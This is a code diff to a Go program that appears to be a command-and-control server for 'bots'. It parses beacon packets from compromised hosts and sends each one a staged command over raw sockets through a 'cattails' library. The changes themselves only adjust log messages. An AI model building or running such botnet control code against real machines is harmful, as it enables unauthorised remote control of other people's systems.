@@ -29,12 +29,11 @@ func sendCommand(iface *net.Interface, src net.IP, dstMAC net.HardwareAddr, list
 		fd := cattails.NewSocket()
 		// Create packet
 		packet := cattails.CreatePacket(iface, src, bot.IP, dstMAC, cattails.CreateCommand(stagedCmd))
-		fmt.Println("Packet:", packet)
-		fmt.Println("Repsonding to:", bot)
+		fmt.Println("[+] Repsonding to:", bot)
 
 		cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
 
-		fmt.Println("Sent reponse sent")
+		fmt.Println("Sent reponse to:", bot.Hostname)
 		unix.Close(fd)
 	}
 }
@@ -45,7 +44,6 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 	data := string(packet.ApplicationLayer().Payload())
 
 	payload := strings.Split(data, " ")
-	fmt.Println("Payload:", payload)
 
 	mac, err := net.ParseMAC(payload[2])
 	if err != nil {
@@ -59,7 +57,7 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 		IP:       net.ParseIP(payload[3]),
 	}
 
-	fmt.Println("My host:", newHost)
+	// Write host to channel
 	listen <- newHost
 }
 
@@ -68,25 +66,26 @@ func main() {
 	vm := cattails.CreateBPFVM(cattails.FilterRaw)
 
 	readfd := cattails.NewSocket()
-	fmt.Println("Created sockets")
 	defer unix.Close(readfd)
+
+	fmt.Println("[+] Created sockets")
 
 	// Make channel
 	listen := make(chan Host)
 
 	// Iface and src ip for the sendcommand func to use
 	iface, src := cattails.GetOutwardIface("8.8.8.8:80")
+	fmt.Println("[+] Interface:", iface.Name)
 
 	dstMAC, err := cattails.GetRouterMAC()
 	if err != nil {
 		log.Fatal(err)
 	}
+	fmt.Println("[+] DST MAC:", dstMAC.String())
 
 	// Spawn routine to listen for responses
-	fmt.Println("Starting go routine...")
+	fmt.Println("[+] Starting go routine...")
 	go sendCommand(iface, src, dstMAC, listen)
-
-	fmt.Println("Entering recieve loop")
 
 	for {
 		// packet := cattails.ServerReadPacket(readfd, vm)
